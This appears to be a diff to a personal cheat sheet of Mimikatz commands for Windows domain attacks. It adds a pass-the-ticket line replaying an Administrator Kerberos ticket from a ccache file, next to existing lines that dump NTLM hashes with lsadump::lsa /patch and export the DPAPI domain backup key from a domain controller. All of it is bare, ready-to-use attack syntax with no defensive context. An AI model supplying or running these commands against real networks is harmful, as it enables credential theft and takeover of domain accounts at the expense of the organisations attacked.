@@ -25,3 +25,5 @@
 ### lsadump::lsa /patch = NTLM hashes dump
 
 ### lsadump::backupkeys /system:localhost /export (Exports DPAPI Domain Backup Key from Domain Controller. VERY IMPORTANT!!!!)
+
+### kerberos::ptc C:\temp\TGT_Administrator@lab.local.ccache (Replay kerberos ticket)
